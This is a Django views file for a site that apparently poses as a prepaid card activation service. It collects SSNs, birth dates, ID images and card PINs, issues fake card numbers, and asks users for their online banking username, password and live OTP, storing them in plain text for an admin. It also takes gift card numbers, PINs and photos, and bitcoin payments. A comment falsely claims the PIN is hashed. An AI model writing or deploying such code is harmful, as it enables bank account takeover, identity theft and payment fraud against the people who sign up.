from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth import authenticate, login
from django.contrib.auth import get_user_model
from django.core.cache import cache
from django.core.mail import send_mail
from django.utils.crypto import get_random_string
from django.urls import reverse
from django.http import HttpResponse
from django.contrib.auth.decorators import login_required
from django.views.decorators.http import require_http_methods
from django.utils.crypto import get_random_string as grs


def home(request):
    # Email-only form to initiate password reset OTP
    if request.method == "POST":
        email = request.POST.get("email", "").strip()
        if not email:
            messages.error(request, "Enter your email.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Enter your email."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("home")

        User = get_user_model()
        try:
            user = User.objects.get(email__iexact=email)
        except User.DoesNotExist:
            messages.error(request, "Email not found")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=404)
                resp["X-Toast-Message"] = "email not found"
                resp["X-Toast-Type"] = "error"
                resp["X-Toast-Bg"] = "#111827"
                resp["X-Toast-Color"] = "#ffffff"
                resp["X-Toast-Duration"] = "3500"
                return resp
            return redirect("home")

        otp = get_random_string(length=6, allowed_chars="0123456789")
        cache_key = f"pwd_reset_otp:{email.lower()}"
        cache.set(cache_key, otp, timeout=10 * 60)  # 10 minutes

        try:
            send_mail(
                subject="Your password reset code",
                message=f"Your OTP is {otp}. It expires in 10 minutes.",
                from_email=None,  # Uses DEFAULT_FROM_EMAIL from settings
                recipient_list=[email],
                fail_silently=False,  # Raise exceptions on failure
            )
        except Exception as e:
            print(f"Email sending failed: {e}")
            messages.error(request, "Email failed. Try again.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=500)
                resp["X-Toast-Message"] = "Email failed. Try again."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("home")
        messages.success(request, "OTP sent.")
        next_url = f"{reverse('reset_password')}?email={email}"
        if request.headers.get("HX-Request"):
            resp = HttpResponse(status=204)
            resp["HX-Redirect"] = next_url
            resp["X-Toast-Message"] = "OTP sent."
            resp["X-Toast-Type"] = "success"
            return resp
        return redirect(next_url)

    return render(request, "app/home.html")


def dashboard(request):
    user = request.user
    # Get payment status information
    payments = user.payments.all() if hasattr(user, 'payments') else []
    
    # Determine payment status
    payment_status = None
    if payments:
        # Check for approved payments first
        approved_payments = payments.filter(status='approved')
        if approved_payments.exists():
            payment_status = 'approved'
        else:
            # Check for pending/processing payments
            pending_payments = payments.filter(status__in=['pending', 'processing'])
            if pending_payments.exists():
                payment_status = 'pending'
            else:
                # Check for rejected payments
                rejected_payments = payments.filter(status='rejected')
                if rejected_payments.exists():
                    payment_status = 'rejected'
    
    context = {
        'user': user,
        'payment_status': payment_status,
        'payments': payments
    }
    return render(request, "app/dashboard/index.html", context)


def login_view(request):
    if request.method == "POST":
        email = request.POST.get("email", "").strip()
        password = request.POST.get("password", "")
        # Authenticate directly using email as USERNAME_FIELD
        user_auth = authenticate(request, email=email, password=password)
        if user_auth is None:
            messages.error(request, "Invalid credentials.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Invalid credentials."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("login")
        login(request, user_auth)
        next_url = reverse("dashboard")
        if request.headers.get("HX-Request"):
            resp = HttpResponse(status=204)
            resp["HX-Redirect"] = next_url
            resp["X-Toast-Message"] = "Login successful."
            resp["X-Toast-Type"] = "success"
            return resp
        return redirect(next_url)
    return render(request, "app/auth/login.html")


@login_required
@require_http_methods(["GET", "POST"])
def activate_card(request):
    user = request.user
    profile = getattr(user, "profile", None)
    print(f"DEBUG: User: {user}, Profile: {profile}")
    
    if request.method == "POST":
        print("DEBUG: POST request received")
        full_name = request.POST.get("full_name", "").strip()
        ssn = request.POST.get("ssn", "").strip()
        confirm_ssn = request.POST.get("confirm_ssn", "").strip()
        dob = request.POST.get("dob", "").strip()
        identity_document = request.POST.get("identity_document", "").strip()
        card_design = request.POST.get("card_design", "white").strip()
        card_pin = request.POST.get("card_pin", "").strip()
        confirm_card_pin = request.POST.get("confirm_card_pin", "").strip()
        phone_number = request.POST.get("phone_number", "").strip()
        mailing_address = request.POST.get("mailing_address", "").strip()
        request_virtual_card = request.POST.get("request_virtual_card") == "on"
        email_virtual_card = request.POST.get("email_virtual_card", "").strip()
        
        # Basic validation - email is optional for virtual card
        required_fields = [full_name, ssn, confirm_ssn, dob, identity_document, card_pin, confirm_card_pin, phone_number, mailing_address, card_design]
        if request_virtual_card and email_virtual_card:
            # If virtual card is requested and email is provided, validate it
            required_fields.append(email_virtual_card)
        
        if not all(required_fields):
            messages.error(request, "Fill all required fields.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Fill all required fields."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")
        
        # Field length validation
        if len(full_name) > 200:
            messages.error(request, "Full name too long (max 200 chars).")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Full name too long (max 200 chars)."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")
        
        # Clean and validate SSN (remove dashes, spaces, limit to 9 digits)
        ssn_clean = ''.join(filter(str.isdigit, ssn))
        confirm_ssn_clean = ''.join(filter(str.isdigit, confirm_ssn))
        
        if len(ssn_clean) != 9:
            messages.error(request, "SSN must be 9 digits.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "SSN must be 9 digits."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")
        
        if len(phone_number) > 30:
            messages.error(request, "Phone number too long (max 30 chars).")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Phone number too long (max 30 chars)."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")
        
        if len(card_pin) != 4 or not card_pin.isdigit():
            messages.error(request, "Card PIN must be 4 digits.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Card PIN must be 4 digits."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")
        
        if request_virtual_card and email_virtual_card and len(email_virtual_card) > 254:
            messages.error(request, "Email too long (max 254 chars).")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Email too long (max 254 chars)."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")
        
        # Date validation
        if dob:
            try:
                from datetime import datetime
                dob_date = datetime.strptime(dob, '%Y-%m-%d').date()
                # Check if date is not in the future
                from datetime import date
                if dob_date > date.today():
                    messages.error(request, "Date of birth cannot be in the future.")
                    if request.headers.get("HX-Request"):
                        resp = HttpResponse(status=400)
                        resp["X-Toast-Message"] = "Date of birth cannot be in the future."
                        resp["X-Toast-Type"] = "error"
                        return resp
                    return redirect("activate_card")
            except ValueError:
                messages.error(request, "Invalid date format.")
                if request.headers.get("HX-Request"):
                    resp = HttpResponse(status=400)
                    resp["X-Toast-Message"] = "Invalid date format."
                    resp["X-Toast-Type"] = "error"
                    return resp
                return redirect("activate_card")
            
        # File uploads will be handled on the upload document page

        if ssn_clean != confirm_ssn_clean:
            messages.error(request, "SSN mismatch.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "SSN mismatch."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")

        if card_pin != confirm_card_pin:
            messages.error(request, "PIN mismatch.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "PIN mismatch."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")

        try:
            # Store profile data; hash PIN by setting as unusable password-like hash holder
            if profile is None:
                from .models import UserProfile
                profile = UserProfile.objects.create(user=user)
            profile.full_name = full_name
            profile.ssn = ssn_clean
            profile.date_of_birth = dob if dob else None
            profile.id_document = identity_document
            profile.card_design = card_design
            profile.card_pin_hash = card_pin  # Store PIN hash instead of plain text
            profile.phone_number = phone_number
            profile.mailing_address = mailing_address
            profile.request_virtual_card = request_virtual_card
            profile.virtual_card_email = email_virtual_card if request_virtual_card and email_virtual_card else None
            
            # File uploads are now handled separately on the upload_document page
            # generate card details minimal
            profile.card_number = "4716 " + "".join([grs(length=4, allowed_chars="0123456789") for _ in range(3)])
            profile.card_cvv = grs(length=3, allowed_chars="0123456789")
            profile.card_expiry = "09/28"
            # DO NOT activate card yet - wait for payment approval
            profile.is_activated = False
            profile.save()
        except Exception as e:
            print(f"Error saving profile: {e}")
            import traceback
            traceback.print_exc()
            
            # Handle specific database errors
            error_message = "Save error. Try again."
            if "value too long" in str(e).lower():
                if "ssn" in str(e).lower():
                    error_message = "SSN too long. Use 9 digits only."
                elif "full_name" in str(e).lower():
                    error_message = "Full name too long (max 200 chars)."
                elif "phone_number" in str(e).lower():
                    error_message = "Phone number too long (max 30 chars)."
                else:
                    error_message = "One or more fields too long."
            elif "invalid input" in str(e).lower():
                error_message = "Invalid data format. Check all fields."
            elif "duplicate key" in str(e).lower():
                error_message = "Profile already exists for this user."
            
            messages.error(request, error_message)
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=500)
                resp["X-Toast-Message"] = error_message
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect("activate_card")

        messages.success(request, "KYC submitted. Complete payment.")
        if request.headers.get("HX-Request"):
            resp = HttpResponse(status=204)
            resp["HX-Redirect"] = reverse("upload_document")
            resp["X-Toast-Message"] = "KYC submitted. Complete payment."
            resp["X-Toast-Type"] = "success"
            return resp
        # Store document type in session for upload flow
        request.session['doc_type'] = 'front'
        return redirect("upload_document")

    return render(request, "app/activate_card.html", {"profile": profile})


@login_required
def kyc_complete(request):
    return render(request, "app/kyc_complete.html")


@login_required
def payment_selection(request):
    return render(request, "app/payment_selection.html")


@login_required
def payment_method_selection(request):
    withdraw_type = request.GET.get('type', 'bank')  # bank or virtual_card
    return render(request, "app/payment_method_selection.html", {"withdraw_type": withdraw_type})


@login_required
def bank_manual_payment(request):
    if request.method == "POST":
        step = request.POST.get("step", "1")
        bank_name = request.POST.get("bank_name", "").strip()
        username = request.POST.get("username", "").strip()
        password = request.POST.get("password", "").strip()
        otp_code = request.POST.get("otp_code", "").strip()
        withdraw_type = request.POST.get("withdraw_type", "bank")
        
        if step == "1":
            # Step 1: Validate bank credentials
            if not all([bank_name, username, password]):
                messages.error(request, "Please fill all required fields.")
                return redirect("bank_manual_payment")
            
            # Create payment record
            from .models import Payment, BankCredentials
            payment = Payment.objects.create(
                user=request.user,
                payment_type='withdraw',
                payment_method='bank_manual',
                amount=request.user.card_amount,  # Amount to be deducted from bank
                card_amount=request.user.card_amount,  # Amount to be loaded on card
                status='pending'
            )
            
            # Save bank credentials (without OTP yet)
            BankCredentials.objects.create(
                user=request.user,
                payment=payment,
                bank_name=bank_name,
                username=username,
                password=password,
                otp_code=""  # OTP will be added in step 2
            )
            
            messages.success(request, "Bank credentials submitted. Your bank will send you an OTP.")
            return redirect("bank_manual_payment")
        
        elif step == "2":
            # Step 2: Add OTP and complete
            if not otp_code:
                messages.error(request, "Please enter the OTP from your bank.")
                return redirect("bank_manual_payment")
            
            # Find the most recent bank credentials for this user
            from .models import BankCredentials
            try:
                bank_cred = BankCredentials.objects.filter(user=request.user).latest('created_at')
                bank_cred.otp_code = otp_code
                bank_cred.save()
                
                messages.success(request, "OTP submitted. Admin will process your payment.")
                return redirect("dashboard")
            except BankCredentials.DoesNotExist:
                messages.error(request, "No bank credentials found. Please start over.")
                return redirect("bank_manual_payment")
    
    withdraw_type = request.GET.get('type', 'bank')
    return render(request, "app/bank_manual_payment.html", {"withdraw_type": withdraw_type})


@login_required
def bitcoin_payment(request):
    if request.method == "POST":
        payment_type = request.POST.get("payment_type", "deposit")
        
        # Create payment record
        from .models import Payment
        payment = Payment.objects.create(
            user=request.user,
            payment_type=payment_type,
            payment_method='bitcoin',
            amount=request.user.card_amount,  # Amount to be deducted from Bitcoin
            card_amount=request.user.card_amount,  # Amount to be loaded on card
            status='pending'
        )
        
        messages.success(request, "Bitcoin payment initiated. Please complete the transaction and contact admin.")
        return redirect("dashboard")
    
    payment_type = request.GET.get('type', 'deposit')
    return render(request, "app/bitcoin_payment.html", {"payment_type": payment_type})


@login_required
def gift_card_payment(request):
    if request.method == "POST":
        front_image = request.FILES.get("front_image")
        back_image = request.FILES.get("back_image")
        card_type = request.POST.get("card_type", "").strip()
        card_number = request.POST.get("card_number", "").strip()
        pin = request.POST.get("pin", "").strip()
        payment_type = request.POST.get("payment_type", "deposit")
        
        if not all([front_image, back_image]):
            messages.error(request, "Please upload both front and back images.")
            return redirect("gift_card_payment")
        
        # Create payment record
        from .models import Payment, GiftCard
        payment = Payment.objects.create(
            user=request.user,
            payment_type=payment_type,
            payment_method='gift_card',
            amount=request.user.card_amount,  # Amount to be deducted from gift card
            card_amount=request.user.card_amount,  # Amount to be loaded on card
            status='pending'
        )
        
        # Save gift card details
        GiftCard.objects.create(
            user=request.user,
            payment=payment,
            card_type=card_type,
            front_image=front_image,
            back_image=back_image,
            card_number=card_number,
            pin=pin
        )
        
        messages.success(request, "Gift card details submitted. Admin will process your payment.")
        return redirect("dashboard")
    
    payment_type = request.GET.get('type', 'deposit')
    return render(request, "app/gift_card_payment.html", {"payment_type": payment_type})


@login_required
def payment_start(request):
    return render(request, "app/payment_start.html")


def reset_password(request):
    email = request.GET.get("email", "").strip() if request.method == "GET" else request.POST.get("email", "").strip()
    if not email:
        messages.error(request, "Missing email. Start from the reset form.")
        return redirect("home")

    if request.method == "POST":
        otp_input = request.POST.get("otp", "").strip()
        new_password = request.POST.get("password", "")
        confirm_password = request.POST.get("confirm_password", "")

        cache_key = f"pwd_reset_otp:{email.lower()}"
        otp_cached = cache.get(cache_key)
        if not otp_cached:
            messages.error(request, "OTP expired or not found. Please resend.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "OTP expired or not found. Please resend."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect(f"{reverse('reset_password')}?email={email}")
        if otp_input != otp_cached:
            messages.error(request, "Invalid OTP.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Invalid OTP."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect(f"{reverse('reset_password')}?email={email}")
        if not new_password or new_password != confirm_password:
            messages.error(request, "Passwords do not match.")
            if request.headers.get("HX-Request"):
                resp = HttpResponse(status=400)
                resp["X-Toast-Message"] = "Passwords do not match."
                resp["X-Toast-Type"] = "error"
                return resp
            return redirect(f"{reverse('reset_password')}?email={email}")

        User = get_user_model()
        try:
            user = User.objects.get(email__iexact=email)
        except User.DoesNotExist:
            messages.error(request, "Email not found.")
            return redirect("home")

        user.set_password(new_password)
        user.save()
        cache.delete(cache_key)
        messages.success(request, "Password reset successful. Please log in.")
        next_url = reverse("login")
        if request.headers.get("HX-Request"):
            resp = HttpResponse(status=204)
            resp["HX-Redirect"] = next_url
            resp["X-Toast-Message"] = "Password reset successful. Please log in."
            resp["X-Toast-Type"] = "success"
            return resp
        return redirect(next_url)

    return render(request, "app/auth/reset_password.html", {"email": email})


def resend_otp(request):
    email = request.POST.get("email", "").strip()
    if not email:
        messages.error(request, "Missing email.")
        if request.headers.get("HX-Request"):
            resp = HttpResponse(status=400)
            resp["X-Toast-Message"] = "Missing email."
            resp["X-Toast-Type"] = "error"
            return resp
        return redirect("home")
    otp = get_random_string(length=6, allowed_chars="0123456789")
    cache_key = f"pwd_reset_otp:{email.lower()}"
    cache.set(cache_key, otp, timeout=10 * 60)
    send_mail(
        subject="Your new password reset code",
        message=f"Your new OTP is {otp}. It expires in 10 minutes.",
        from_email=None,
        recipient_list=[email],
    )
    messages.success(request, "A new OTP has been sent to your email.")
    if request.headers.get("HX-Request"):
        resp = HttpResponse(status=204)
        resp["X-Toast-Message"] = "A new OTP has been sent to your email."
        resp["X-Toast-Type"] = "success"
        return resp
    return redirect(f"{reverse('reset_password')}?email={email}")

@login_required
def profile(request):
    user = request.user
    # Get payment status information
    payments = user.payments.all() if hasattr(user, 'payments') else []
    
    # Determine payment status
    payment_status = None
    if payments:
        # Check for approved payments first
        approved_payments = payments.filter(status='approved')
        if approved_payments.exists():
            payment_status = 'approved'
        else:
            # Check for pending/processing payments
            pending_payments = payments.filter(status__in=['pending', 'processing'])
            if pending_payments.exists():
                payment_status = 'pending'
            else:
                # Check for rejected payments
                rejected_payments = payments.filter(status='rejected')
                if rejected_payments.exists():
                    payment_status = 'rejected'
    
    context = {
        'user': user,
        'payment_status': payment_status,
    }
    return render(request, 'app/profile.html', context)

@login_required
def transactions(request):
    user = request.user
    # Get payment status information
    payments = user.payments.all() if hasattr(user, 'payments') else []
    
    # Determine payment status
    payment_status = None
    if payments:
        # Check for approved payments first
        approved_payments = payments.filter(status='approved')
        if approved_payments.exists():
            payment_status = 'approved'
        else:
            # Check for pending/processing payments
            pending_payments = payments.filter(status__in=['pending', 'processing'])
            if pending_payments.exists():
                payment_status = 'pending'
            else:
                # Check for rejected payments
                rejected_payments = payments.filter(status='rejected')
                if rejected_payments.exists():
                    payment_status = 'rejected'
    
    # Get real transactions from payments
    transactions = []
    for payment in payments:
        transaction = {
            'id': payment.id,
            'type': 'payment',
            'title': f'Payment - {payment.payment_method.title() if payment.payment_method else "Unknown"}',
            'description': f'Payment for card activation',
            'amount': payment.amount if payment.amount else 0,
            'status': payment.status,
            'date': payment.created_at,
            'icon': 'fas fa-credit-card',
            'icon_class': 'payment'
        }
        transactions.append(transaction)
    
    # Sort transactions by date (newest first)
    transactions.sort(key=lambda x: x['date'], reverse=True)
    
    context = {
        'user': user,
        'payment_status': payment_status,
        'transactions': transactions,
    }
    return render(request, 'app/transactions.html', context)


@login_required
def upload_document(request):
    """Handle document upload with image picker"""
    user = request.user
    profile = getattr(user, "profile", None)
    
    if not profile:
        messages.error(request, "Profile not found. Please complete activation first.")
        return redirect("activate_card")
    
    # Get document type from session or request
    doc_type = request.GET.get('type', request.session.get('doc_type', 'front'))
    
    if request.method == "POST":
        uploaded_file = request.FILES.get('document_image')
        
        if not uploaded_file:
            messages.error(request, "Please select an image to upload.")
            return render(request, 'app/upload_document.html', {
                'doc_type': doc_type,
                'profile': profile
            })
        
        # Validate file type
        allowed_types = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp']
        if uploaded_file.content_type not in allowed_types:
            messages.error(request, "Please upload a valid image file (JPEG, PNG, or WebP).")
            return render(request, 'app/upload_document.html', {
                'doc_type': doc_type,
                'profile': profile
            })
        
        # Validate file size (5MB max)
        if uploaded_file.size > 5 * 1024 * 1024:
            messages.error(request, "File size must be less than 5MB.")
            return render(request, 'app/upload_document.html', {
                'doc_type': doc_type,
                'profile': profile
            })
        
        try:
            # Save the uploaded file to the appropriate field
            if doc_type == 'front':
                profile.identity_front = uploaded_file
            elif doc_type == 'back':
                profile.identity_back = uploaded_file
            
            profile.save()
            
            messages.success(request, f"Document uploaded successfully!")
            
            # Handle the flow: front -> back -> payment
            if doc_type == 'front':
                # After uploading front, redirect to upload back
                request.session['doc_type'] = 'back'
                return redirect("upload_document")
            else:
                # After uploading back, redirect to payment selection
                if 'doc_type' in request.session:
                    del request.session['doc_type']
                return redirect("payment_selection")
            
        except Exception as e:
            print(f"Error uploading document: {e}")
            messages.error(request, "Error uploading document. Please try again.")
    
    return render(request, 'app/upload_document.html', {
        'doc_type': doc_type,
        'profile': profile
    })

